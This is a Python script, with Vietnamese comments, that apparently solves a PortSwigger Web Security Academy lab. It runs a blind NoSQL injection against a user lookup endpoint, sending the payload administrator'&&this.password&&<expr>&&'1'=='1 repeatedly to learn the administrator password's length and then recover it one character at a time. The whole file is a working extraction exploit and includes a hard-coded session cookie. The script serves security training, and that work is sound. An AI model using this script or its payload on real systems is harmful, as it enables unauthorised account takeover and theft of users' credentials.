# brute_nosql_pw.py
import requests
import string

BASE = "https://0a050089041584808093358100520088.web-security-academy.net"
LOOKUP = f"{BASE}/user/lookup"
COOKIE = "HAoqdSmLLMMHzPAXNZS0QIUBEFOYAFvd"  # thay nếu cần
COOKIES = {"session": COOKIE}
ALPHABET = "abcdefghijklmnopqrstuvwxyz"  # theo đề: chỉ chữ thường
TIMEOUT = 10

def is_hit(resp_text: str) -> bool:
    # Đúng khi KHÔNG có "Could not find user"
    return '"Could not find user"' not in resp_text

def probe(expr: str) -> bool:
    """
    Gửi payload dạng: administrator' && this.password && <expr> && '1'=='1
    Ví dụ expr: this.password.length==12
                this.password.charAt(0)=='o'
    """
    inj = f"administrator'&&this.password&&{expr}&&'1'=='1"
    # requests sẽ tự URL-encode: ' -> %27, && -> %26%26, v.v.
    r = requests.get(LOOKUP, params={"user": inj}, cookies=COOKIES, timeout=TIMEOUT)
    return is_hit(r.text)

def find_length(max_len: int = 64) -> int:
    for n in range(1, max_len + 1):
        if probe(f"this.password.length=={n}"):
            return n
    raise RuntimeError("Không tìm được length (tăng max_len hoặc kiểm tra session).")

def find_password(length: int) -> str:
    pw = []
    for i in range(length):
        hit = None
        for c in ALPHABET:
            if probe(f"this.password.charAt({i})=='{c}'"):
                pw.append(c)
                print(f"[+] pos {i}: {c}  =>  {''.join(pw)}", flush=True)
                hit = c
                break
        if hit is None:
            raise RuntimeError(f"Không tìm được ký tự tại pos {i} (cookie hết hạn hoặc rate-limit?).")
    return "".join(pw)

if __name__ == "__main__":
    print("[*] Tìm độ dài mật khẩu...")
    L = find_length()
    print(f"[+] Length = {L}")
    print("[*] Brute từng ký tự...")
    pwd = find_password(L)
    print(f"[✓] Password: {pwd}")
